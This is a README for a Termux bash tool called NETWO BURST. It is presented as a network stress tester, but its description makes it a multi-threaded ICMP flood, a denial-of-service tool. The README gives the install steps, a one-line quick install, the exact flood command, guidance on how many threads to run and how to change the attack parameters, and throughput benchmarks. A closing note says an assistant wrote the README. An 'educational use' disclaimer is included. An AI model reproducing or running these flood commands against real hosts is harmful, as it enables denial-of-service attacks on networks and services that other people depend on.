# NETWO BURST

<div align="center">
▄██████████████▄▐█▄▄▄▄█▌
      ██████▌▄▌▄▐▐▌███▌▀▀██▀▀
      ████▄█▌▄▌▄▐▐▌▀███▄▄█▌
      ▄▄▄▄▄██████████████▀
      
### Advanced Network Stress Testing Tool

[![License](https://img.shields.io/badge/license-MIT-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Termux-blue.svg)]()
[![Bash](https://img.shields.io/badge/bash-5.0+-green.svg)]()

Multi-threaded ICMP flood tool with real-time network monitoring

[Installation](#installation) • [Usage](#usage) • [Features](#features) • [Legal](#legal-disclaimer)

</div>

---

## Overview

NETWO BURST is a powerful network stress testing tool built for Termux/proot-distro Arch Linux. Deploy parallel attack threads while monitoring real-time network speeds and system performance.

## Features

🚀 **Multi-threaded Architecture**
- Deploy unlimited parallel attack threads
- Individual thread monitoring with live statistics
- Auto-restart on failure

⚡ **ICMP Flood Attack**
- Maximum packet size (65,027 bytes)
- Zero-interval flooding
- Continuous packet transmission

📊 **Real-time Monitoring**
- Live upload/download speed tracking
- Per-thread packet statistics
- Network quality indicators
- Speed trend visualization

🎨 **Professional Interface**
- Color-coded terminal output
- Live dashboard with progress bars
- Animated status indicators

## Installation

### Prerequisites
- Termux (Android)
- proot-distro
- Arch Linux environment

### Setup

```bash
# Install Termux from F-Droid or GitHub
# https://github.com/termux/termux-app/releases

# Update packages
pkg update && pkg upgrade -y

# Install proot-distro
pkg install proot-distro -y

# Install Arch Linux
proot-distro install archlinux

# Login to Arch
proot-distro login archlinux

# Install dependencies
pacman -Syu --noconfirm
pacman -S curl iputils bc git --noconfirm

# Clone repository
git clone https://github.com/yourusername/netwo-burst.git
cd netwo-burst

# Make executable
chmod +x netwo_burst.sh

# Run
./netwo_burst.sh
```
```bash
Quick Install
proot-distro login archlinux -- bash -c "pacman -Syu --noconfirm && pacman -S git curl iputils bc --noconfirm && git clone https://github.com/yourusername/netwo-burst.git && cd netwo-burst && chmod +x netwo_burst.sh && ./netwo_burst.sh"
```
Usage
Basic Usage
./netwo_burst.sh
Follow the prompts:
Enter number of threads (e.g., 10)
Monitor the attack in real-time
Press Ctrl+C to stop

Recommended Thread Counts

|Device | Threads | Notes|
|Low-end | 5-10 | 2-4 cores|
|Mid-range | 10-20 | 4-6 cores|
|High-end | 20-50 | 8+ cores|







 

⚠️ Too many threads may cause system instability
Interface Preview
Dashboard
╔════════════════════════════════════════════════════════════╗
║               NETWORK BURST - LIVE MONITOR                 ║
╚════════════════════════════════════════════════════════════╝

Target: 203.0.113.1 │ Threads: 10 │ Uptime: 00:05:23

┌────────────────────────────────────────────────────────────┐
│                  NETWORK SPEED MONITOR                     │
└────────────────────────────────────────────────────────────┘
↑ Upload:   ███████████████████████░░░░░░░ 67.89 MB/s
↓ Download: ██████████░░░░░░░░░░░░░░░░░░░░ 23.45 MB/s
Quality:    OVERLOADED

┌────────────────────────────────────────────────────────────┐
│                    THREAD STATUS                           │
└────────────────────────────────────────────────────────────┘
Thread #01 ● ACTIVE │ 45678 pkts │ 152 pkt/s │ ████████████░░░░░░░░
Thread #02 ● ACTIVE │ 46123 pkts │ 154 pkt/s │ █████████████░░░░░░░
Thread Output
[THR-01] ▶ PKT#1234 │ 0.891ms │ 65027B │ CPU:87% │ BW:734MB/s │ FLOODING
[THR-02] ▶ PKT#1235 │ 1.243ms │ 65027B │ CPU:91% │ BW:689MB/s │ FLOODING
[THR-03] ▶ PKT#1236 │ 0.654ms │ 65027B │ CPU:85% │ BW:712MB/s │ FLOODING
Technical Details
Attack Mechanism
ping -i 0 -c 999999 -s 65027 -W 999 $TARGET_IP
Parameters:
-i 0 - Zero interval (flood mode)
-c 999999 - Packet count
-s 65027 - Maximum ICMP payload
-W 999 - Response timeout
Architecture
Main Process
    ├── Thread Monitor (statistics)
    ├── Speed Calculator (network metrics)
    └── Attack Threads (1 to N)
        ├── Thread #1 → ping loop
        ├── Thread #2 → ping loop
        └── ...
Performance
Benchmarks
Tested on OnePlus 9 Pro, Android 13, WiFi 6
Threads
Packets/sec
Upload
CPU
Status
5
750
35 MB/s
45%
✅ Stable
10
1,540
72 MB/s
78%
✅ Stable
20
3,080
145 MB/s
95%
⚠️ Hot
50
7,650
360 MB/s
100%
❌ Unstable
Troubleshooting
Target acquisition failed
curl -s icanhazip.com  # Check internet
Permission denied
chmod +x netwo_burst.sh
Missing dependencies
pacman -S bc curl iputils
Interface not detected
export NET_IFACE="wlan0"
./netwo_burst.sh
Configuration
Custom Network Interface
export NET_IFACE="wlan0"
Modify Attack Parameters
Edit netwo_burst.sh:
# Change these values
ping -i 0 -c 999999 -s 65027 -W 999 $ip
#      │      │        │       │
#      │      │        │       └─ Timeout
#      │      │        └─ Packet size
#      │      └─ Packet count
#      └─ Interval
Educational Use
Authorized Use Cases:
Network infrastructure testing
Security research in controlled environments
Performance benchmarking
Academic projects
Legal Disclaimer
⚠️  FOR EDUCATIONAL PURPOSES ONLY
NETWO BURST is designed for authorized network testing only.
Legal Usage
✅ Allowed:
Your own networks
Networks with explicit written permission
Authorized penetration testing
Academic research
❌ Prohibited:
Unauthorized network access
Attacking public services
Malicious activities
Responsibility
Users are solely responsible for their actions. Unauthorized use may violate:
Computer Fraud and Abuse Act (USA)
Computer Misuse Act (UK)
Local cybercrime laws
The developers assume NO LIABILITY for misuse.
⚠️  ALWAYS OBTAIN AUTHORIZATION BEFORE TESTING
Contributing
Contributions welcome! Please:
Fork the repository
Create a feature branch
Commit your changes
Submit a pull request
License
MIT License - see LICENSE file
Support
📧 Issues: GitHub Issues
📖 Wiki: Documentation
�

Made for network security professionals and researchers
⭐ Star this repo if you find it useful
�
```




(𝐒𝐎𝐑𝐑𝐘 𝐘𝐎𝐔 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐀𝐒 𝐌𝐀𝐍𝐘 𝐀𝐒 𝐏𝐎𝐒𝐒𝐈𝐁𝐋𝐄 𝐈𝐌 𝐒𝐎𝐑𝐑𝐘 𝐁𝐂 𝐌𝐘 𝐀𝐒𝐒𝐈𝐒𝐓𝐀𝐍𝐓 𝐓𝐇𝐀𝐓 𝐆𝐀𝐍𝐄𝐑𝐀𝐓𝐄 𝐓𝐇𝐈𝐒 𝐑𝐄𝐀𝐃 𝐌𝐄) 
